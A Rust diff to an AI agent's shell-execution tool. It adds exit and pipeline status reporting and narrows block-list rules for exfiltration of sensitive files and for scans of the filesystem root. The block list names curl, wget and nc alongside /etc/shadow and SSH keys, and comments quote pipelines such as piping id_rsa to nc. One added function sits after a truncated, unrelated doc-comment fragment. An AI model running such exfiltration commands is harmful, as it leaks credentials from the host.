@@ -421,6 +421,13 @@ impl Tool for BashTool {
          normal case but is NOT guaranteed: on a host with no bash those constructs \
          either error or, worse, silently misparse. If a command must work everywhere, \
          write it in POSIX. The dialect in force is logged once per process. \
+         \n\nEXIT STATUS: every result body ends with `exit=<N>`, success included, \
+         so `(no output) · exit=0` (ran, printed nothing) is distinguishable from a \
+         call that never ran. For a pipeline the line also carries \
+         `pipestatus=<a b c>`, and the reported status is the LEFTMOST non-zero \
+         element, so a failure in an earlier element is not hidden by a `| tail` \
+         — except SIGPIPE (141), which `… | head` produces on purpose and which is \
+         not reported as a failure. `pipefail` is not enabled. \
          \n\nGITHUB OPERATIONS: use the `gh` CLI via this tool for \
          everything GitHub — issues, PRs, releases, comments, file \
          fetches, repo / code search, workflow runs, checks. When \
@@ -639,9 +646,8 @@ impl Tool for BashTool {
         {
             match crate::utils::long_command::classify(&input.command) {
                 Detach::Yes { marker } => {
-                    let label = crate::brain::agent::service::background_tasks::short_label(
-                        &input.command,
-                    );
+                    let label =
+                        crate::brain::agent::service::background_tasks::short_label(&input.command);
                     tracing::info!(
                         target: "background_task",
                         "Detaching '{label}' for session {}: '{marker}' starts a command",
@@ -699,6 +705,13 @@ impl Tool for BashTool {
         // RTK rewrite tracking (hoisted from normal-execution branch)
         #[cfg(feature = "rtk")]
         let mut rtk_was_rewritten = false;
+
+        // #910: the side channel the status suffix writes `${PIPESTATUS[@]}`
+        // into. Decided here, before any spawn, and cleared first so a file
+        // left behind by an earlier process at the same pid cannot be read
+        // back as this command's status.
+        let pipestatus_file = pipestatus_side_channel_path();
+        let _ = std::fs::remove_file(&pipestatus_file);
 
         let output = if let Some(password) = sudo_password {
             // Rewrite command to read password from stdin via -S flag
@@ -951,7 +964,11 @@ impl Tool for BashTool {
             cmd.kill_on_drop(true);
             // Verbatim command line (H-05). This is the main execution path:
             // every quoted command the model sends flows through here.
-            cmd.push_shell_command(shell_arg, &execution_command)
+            // #910: `shell_command_text` appends the PIPESTATUS suffix (on a
+            // shell that has it) and `PIPESTATUS_ENV` names the side channel it
+            // writes to; the command itself is still passed through verbatim.
+            cmd.push_shell_command(shell_arg, &shell_command_text(&execution_command))
+                .env(PIPESTATUS_ENV, &pipestatus_file)
                 .current_dir(&working_dir)
                 .stdin(std::process::Stdio::null())
                 .stdout(std::process::Stdio::piped())
@@ -999,9 +1016,9 @@ impl Tool for BashTool {
                     )
                     .await
                 {
-                    Ok(crate::brain::agent::service::background_tasks::Handover::Inline(output)) => {
-                        output
-                    }
+                    Ok(crate::brain::agent::service::background_tasks::Handover::Inline(
+                        output,
+                    )) => output,
                     Ok(crate::brain::agent::service::background_tasks::Handover::Detached {
                         id,
                         pid,
@@ -1106,7 +1123,12 @@ impl Tool for BashTool {
         // Convert output to strings
         let stdout = String::from_utf8_lossy(&output.stdout).to_string();
         let stderr = String::from_utf8_lossy(&output.stderr).to_string();
-        let exit_code = output.status.code().unwrap_or(-1);
+        // #910: the shell's own status is the LAST pipeline element's unless the
+        // suffix reported the whole list, so the list is authoritative when
+        // there is one. Empty — no pipeline, the `sh` fallback, Windows, or a
+        // command that `exec`d — leaves the shell's status standing.
+        let pipestatus = read_pipestatus(&pipestatus_file);
+        let exit_code = effective_exit_status(&pipestatus, output.status.code().unwrap_or(-1));
 
         // RTK metrics tracking: record that the command was rewritten.
         // We can't measure "original" tokens without running the command twice,
@@ -1163,10 +1185,22 @@ impl Tool for BashTool {
         // errors surface as exit 2+ and/or stderr output). Treating that as a
         // failure inflated the bash failure rate with search noise (#663).
         let search_no_match = is_search_no_match(&input.command, exit_code, &stderr);
-        let success = output.status.success() || search_no_match;
+        let success = exit_code == 0 || search_no_match;
 
         if search_no_match && result_text == "(no output)" {
             result_text = "(no matches found)".to_string();
+        }
+
+        // #914: state the status on EVERY body, success included. A bare
+        // `(no output)` could equally mean "ran, printed nothing" or "never
+        // ran"; `(no output) · exit=0` cannot, and `· exit=1` on a no-match
+        // search says which of the two greps returned.
+        let trailer = status_trailer(exit_code, &pipestatus);
+        if result_text == "(no output)" || result_text == "(no matches found)" {
+            result_text = format!("{result_text} · {trailer}");
+        } else {
+            result_text.push_str("\n\n");
+            result_text.push_str(&trailer);
         }
 
         // Record the outcome so a follow-up call with the exact same
@@ -1198,6 +1232,123 @@ impl Tool for BashTool {
         Ok(result
             .with_metadata("exit_code".to_string(), exit_code.to_string())
             .with_metadata("working_dir".to_string(), working_dir.display().to_string()))
+    }
+}
+
+// ─── Reporting the exit status of a command (#910, #914) ─────────────────
+
+/// Environment variable carrying the path of the side channel into which the
+/// shell writes `${PIPESTATUS[@]}` once the command has finished (#910).
+///
+/// A side channel rather than a marker on stdout/stderr because both streams
+/// are the caller's data: a marker line appended to either would corrupt the
+/// output the model reads, and the background runner captures both to files it
+/// hands back verbatim. Only the inline path sets it — a detached run reports
+/// its status through the shell's own exit code and needs no file.
+pub(crate) const PIPESTATUS_ENV: &str = "OPENCRABS_PIPESTATUS_FILE";
+
+/// `128 + SIGPIPE`: the status a producer reports when its consumer stopped
+/// reading (`yes | head -1`). Not a failure — see [`PIPESTATUS_SUFFIX`].
+const SIGPIPE_STATUS: i32 = 141;
+
+/// What the harness appends to a command so a failed pipeline ELEMENT is not
+/// lost (#910).
+///
+/// Why not `set -o pipefail`: piping through `head`/`tail`/`grep` is the normal
+/// way an agent trims output, and `yes | head -1` or `cmd | head -20`
+/// legitimately ends with the producer killed by SIGPIPE. Under `pipefail`
+/// that reports 141 and turns a working command into a reported failure. This
+/// suffix reads the per-element statuses instead, ignores 141 (a consumer
+/// saying "enough"), and exits with the LEFTMOST remaining non-zero element —
+/// so `false | tail -1` is a failure and `cat big | head -20` is not. The same
+/// per-element list is written to [`PIPESTATUS_ENV`] so the caller can quote it.
+///
+/// Appended, never prepended, so the command's own text is untouched (the
+/// verbatim-quoting contract, H-05). The leading newline keeps a trailing
+/// `# comment` from swallowing it. A command that ends with `exit` or `exec`
+/// never reaches the suffix; its own status is the status, which is correct.
+const PIPESTATUS_SUFFIX: &str = r#"
+__oc_ps=("${PIPESTATUS[@]}")
+__oc_eff=0
+for __oc_e in "${__oc_ps[@]}"; do
+  if [ "$__oc_e" -ne 0 ] && [ "$__oc_e" -ne 141 ]; then __oc_eff=$__oc_e; break; fi
+done
+if [ "${#__oc_ps[@]}" -gt 1 ] && [ -n "${OPENCRABS_PIPESTATUS_FILE:-}" ]; then
+  printf '%s ' "${__oc_ps[@]}" > "$OPENCRABS_PIPESTATUS_FILE" 2>/dev/null
+fi
+exit "$__oc_eff"
+"#;
+
+/// The text to hand the shell: `command` verbatim, plus [`PIPESTATUS_SUFFIX`]
+/// on a shell that reports `${PIPESTATUS[@]}`. On the `sh` fallback and on
+/// Windows the command is passed through untouched, because the suffix cannot
+/// work there and a half-supported shell would be worse than none.
+pub(crate) fn shell_command_text(command: &str) -> String {
+    if crate::utils::shell::shell_reports_pipestatus() {
+        format!("{command}{PIPESTATUS_SUFFIX}")
+    } else {
+        command.to_string()
+    }
+}
+
+/// The status to report for a finished command (#910).
+///
+/// `pipestatus` is the shell's per-element list (`[1, 0]` for
+/// `false | tail -1`), or empty when the command was not a pipeline / the
+/// shell could not report it — in which case the shell's own status stands.
+/// The leftmost element that is neither 0 nor SIGPIPE is the answer: a real
+/// failure anywhere in the pipeline is visible, while a producer that died
+/// because its consumer stopped reading is not.
+pub(crate) fn effective_exit_status(pipestatus: &[i32], shell_status: i32) -> i32 {
+    if pipestatus.is_empty() {
+        return shell_status;
+    }
+    pipestatus
+        .iter()
+        .copied()
+        .find(|&code| code != 0 && code != SIGPIPE_STATUS)
+        .unwrap_or(0)
+}
+
+/// Parse the space-separated `${PIPESTATUS[*]}` the suffix wrote. Anything
+/// unparseable is dropped rather than defaulted: a corrupt side channel must
+/// read as "no information", never as exit 0.
+pub(crate) fn parse_pipestatus(raw: &str) -> Vec<i32> {
+    raw.split_whitespace()
+        .filter_map(|tok| tok.parse::<i32>().ok())
+        .collect()
+}
+
+/// A per-call path for the side channel. `pid` plus a process-local counter is
+/// unique among live processes; the caller removes any stale file at the same
+/// path before spawning, so a recycled pid cannot be read as this command's.
+fn pipestatus_side_channel_path() -> std::path::PathBuf {
+    static SEQ: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
+    let seq = SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+    std::env::temp_dir().join(format!("opencrabs-pipestatus-{}-{seq}", std::process::id()))
+}
+
+/// Read and remove the side channel. An absent file means "no pipeline" — the
+/// suffix writes only when the command had one — and is never an error.
+fn read_pipestatus(path: &std::path::Path) -> Vec<i32> {
+    let raw = std::fs::read_to_string(path).unwrap_or_default();
+    let _ = std::fs::remove_file(path);
+    parse_pipestatus(&raw)
+}
+
+/// The status line every result body carries (#914): `exit=<N>` on its own,
+/// plus the per-element list when the command was a pipeline (#910).
+///
+/// Without this, "the command ran and printed nothing" (`(no output)`), "the
+/// search matched nothing" (`(no matches found)`) and "the command never ran"
+/// all rendered as the same string, and a lane had to spend a round-trip to
+/// tell them apart.
+pub(crate) fn status_trailer(exit_code: i32, pipestatus: &[i32]) -> String {
+    if pipestatus.len() > 1 {
+        let elements: Vec<String> = pipestatus.iter().map(i32::to_string).collect();
+        format!("exit={exit_code} pipestatus={}", elements.join(" "))
+    } else {
+        format!("exit={exit_code}")
     }
 }
 
@@ -1484,13 +1635,39 @@ fn check_blocked_inner(command: &str, depth: usize) -> Option<&'static str> {
     }
 
     // ── Network exfiltration of sensitive files ──────────────────
-    if (normalized.contains("curl") || normalized.contains("wget") || normalized.contains("nc "))
-        && (normalized.contains("/etc/shadow")
-            || normalized.contains("/etc/passwd")
-            || normalized.contains("id_rsa")
-            || normalized.contains(".ssh/"))
-    {
-        return Some("network exfiltration of sensitive files");
+    // Per PIPELINE CHAIN, not over the whole command string (#915 arm 1).
+    // Co-occurrence anywhere in the string refused a read-only
+    // `grep -c "Host " ~/.ssh/config` merely because a later `;`-separated
+    // command fetched a public IP — the grep reads no byte out and the curl
+    // touches nothing sensitive, so the refusal cost the lane its turn.
+    //
+    // A chain is the unit a shell runs SEQUENTIALLY — `;`, `&&`, `||`, newline
+    // — and a `|` deliberately stays INSIDE it: a pipe is a data flow, so
+    // `cat ~/.ssh/id_rsa | nc host 443` is the same exfiltration as
+    // `nc host 443 < ~/.ssh/id_rsa` and must keep firing. The interpreter
+    // payload pass below still re-checks `bash -c '<curl …>'` on its own.
+    for chain in split_pipeline_chains(command) {
+        let chain = chain.to_lowercase();
+        let network = chain.contains("curl") || chain.contains("wget") || chain.contains("nc ");
+        let sensitive = chain.contains("/etc/shadow")
+            || chain.contains("/etc/passwd")
+            || chain.contains("id_rsa")
+            || chain.contains(".ssh/");
+        if network && sensitive {
+            return Some("network exfiltration of sensitive files");
+        }
+    }
+
+    // ── Unbounded scan of the filesystem root ────────────────────
+    // Per SIMPLE COMMAND (#915 arm 2), so `ls | grep -r x /` is caught as well
+    // as a leading `find /`: a root scan is a property of one command, not of
+    // two commands' co-occurrence. `find / -name fleet.json` wedged six lanes
+    // in one poll window, each run costing minutes of wall clock and starving
+    // every peer's ledger write. A named subtree is the alternative.
+    for segment in split_command_segments(command) {
+        if let Some(reason) = unbounded_root_scan(&segment.to_lowercase()) {
+            return Some(reason);
+        }
     }
 
     // ── Crypto mining / known malware patterns ───────────────────
@@ -1663,6 +1840,170 @@ pub(crate) fn recorded_at_of(session_id: Uuid, cmd: &str) -> Option<Instant> {
 ///
 /// The Apr 23 stdin-detach fix made the bash tool well-behaved (no more
 /// keystroke theft from the TUI), but it also made interactive commands
+/// Split a shell command into the units it runs SEQUENTIALLY — on `;`, `&&`,
+/// `||` and newline — keeping each pipeline intact (#915).
+///
+/// A pipeline is one unit of work whose elements share a data flow, which is
+/// why `|` is not a boundary here: `cat ~/.ssh/id_rsa | nc host 443` is one
+/// chain, and a rule that must see "a network tool and a sensitive path in the
+/// same unit" has to see both halves of it. What the split buys is the other
+/// direction — `grep -c "Host " ~/.ssh/config; curl -s https://api.ipify.org`
+/// is TWO chains, so a rule keyed on one chain no longer refuses a read-only
+/// grep because an unrelated fetch follows it.
+///
+/// Quoting is respected exactly as in [`split_command_segments`]: inside
+/// `'…'`/`"…"` and behind a backslash, separators are literal. A lone `|` or a
+/// lone `&` (background, `2>&1`) stays inside the chain — the conservative
+/// direction, since it can only make two things look like one unit.
+fn split_pipeline_chains(command: &str) -> Vec<String> {
+    let mut chains = Vec::new();
+    let mut cur = String::new();
+    let mut in_single = false;
+    let mut in_double = false;
+    let mut escaped = false;
+    let mut chars = command.chars().peekable();
+
+    while let Some(ch) = chars.next() {
+        if escaped {
+            cur.push(ch);
+            escaped = false;
+            continue;
+        }
+        if in_single {
+            if ch == '\'' {
+                in_single = false;
+            }
+            cur.push(ch);
+            continue;
+        }
+        if in_double {
+            match ch {
+                '\\' => escaped = true,
+                '"' => in_double = false,
+                _ => {}
+            }
+            cur.push(ch);
+            continue;
+        }
+        match ch {
+            '\\' => {
+                escaped = true;
+                cur.push(ch);
+            }
+            '\'' => {
+                in_single = true;
+                cur.push(ch);
+            }
+            '"' => {
+                in_double = true;
+                cur.push(ch);
+            }
+            ';' | '\n' => {
+                if !cur.trim().is_empty() {
+                    chains.push(cur.trim().to_string());
+                }
+                cur.clear();
+            }
+            '&' | '|' => {
+                // `&&` / `||` end a chain; a lone `&` or `|` does not.
+                if chars.peek() == Some(&ch) {
+                    chars.next();
+                    if !cur.trim().is_empty() {
+                        chains.push(cur.trim().to_string());
+                    }
+                    cur.clear();
+                } else {
+                    cur.push(ch);
+                }
+            }
+            _ => cur.push(ch),
+        }
+    }
+    if !cur.trim().is_empty() {
+        chains.push(cur.trim().to_string());
+    }
+    chains
+}
+
+/// Refusal text for an unbounded scan of the filesystem root (#915 arm 2).
+const ROOT_SCAN_REFUSAL: &str = concat!(
+    "unbounded scan of the filesystem root — `environment.md` forbids it: a `find /` / ",
+    "`du /` stampedes the disk for minutes and starves every other lane's ledger write. ",
+    "Name the subtree instead, e.g. `find /root/<project> -name <pattern>`"
+);
+
+/// Is this (already lowercased) simple command an unbounded scan of `/`
+/// (#915 arm 2)?
+///
+/// Six lanes ran one in a single poll window, each between two and twenty
+/// minutes of wall clock, and the path was readable from a skill file the whole
+/// time. `environment.md` codified the prohibition; nothing enforced it at the
+/// tool.
+///
+/// The operand position is what separates a scan from a search: for `grep` the
+/// FIRST non-flag token is the pattern and only the tokens after it are paths,
+/// so a bare `grep -r PATTERN` — which reads stdin, not `/` — cannot match.
+fn unbounded_root_scan(chain: &str) -> Option<&'static str> {
+    /// Is `tok` one of the root spellings this rule refuses?
+    fn is_root(tok: &str) -> bool {
+        matches!(
+            tok.trim_matches(|c| c == '"' || c == '\''),
+            "/" | "/*" | "//"
+        )
+    }
+
+    /// Does a `grep`-family flag cluster ask for recursion?
+    fn recursive_flag(tok: &str) -> bool {
+        if tok == "--recursive" || tok == "--dereference-recursive" {
+            return true;
+        }
+        // Short cluster (`-rn`, `-rE`, `-rf`); long flags like `--include=…` are
+        // not clusters and must not be read as one.
+        tok.starts_with('-') && !tok.starts_with("--") && tok[1..].contains(['r', 'R'])
+    }
+
+    let tokens: Vec<&str> = chain.split_whitespace().collect();
+    // The command word, past a prefix that wraps another command.
+    let mut idx = 0;
+    while idx < tokens.len()
+        && matches!(
+            tokens[idx],
+            "sudo" | "time" | "nice" | "env" | "nohup" | "command" | "builtin"
+        )
+    {
+        idx += 1;
+    }
+    // `VAR=value` assignments may precede the command word.
+    while idx < tokens.len() && tokens[idx].contains('=') && !tokens[idx].starts_with('-') {
+        idx += 1;
+    }
+    let word = tokens.get(idx)?.rsplit('/').next().unwrap_or("");
+    let rest = &tokens[idx + 1..];
+
+    match word {
+        // `find`/`du` take their paths first; a bare `/` anywhere in the
+        // operands is the whole filesystem.
+        "find" | "du" => rest
+            .iter()
+            .copied()
+            .any(is_root)
+            .then_some(ROOT_SCAN_REFUSAL),
+        // `grep -r`: operands[0] is the pattern, everything after it is a path.
+        "grep" | "egrep" | "fgrep" => {
+            if !rest.iter().copied().any(recursive_flag) {
+                return None;
+            }
+            rest.iter()
+                .copied()
+                .filter(|t| !t.starts_with('-'))
+                .skip(1)
+                .any(is_root)
+                .then_some(ROOT_SCAN_REFUSAL)
+        }
+        _ => None,
+    }
+}
+
 /// Split a shell command string into executable segments (`a && b`, `a; b`, `a | b`,
 /// multi-line commands), respecting POSIX single quotes (`'...'`), double quotes (`"..."`),
 /// and backslash escapes (`\`).
@@ -2006,7 +2347,11 @@ fn has_sql_source(args: &[&str], short: &str, long: &str) -> bool {
 fn redis_cli_flag_takes_value(tok: &str) -> bool {
     matches!(
         tok,
-        "-h" | "-p" | "-a" | "-u" | "-s" | "-n"
+        "-h" | "-p"
+            | "-a"
+            | "-u"
+            | "-s"
+            | "-n"
             | "--host"
             | "--port"
             | "--pass"
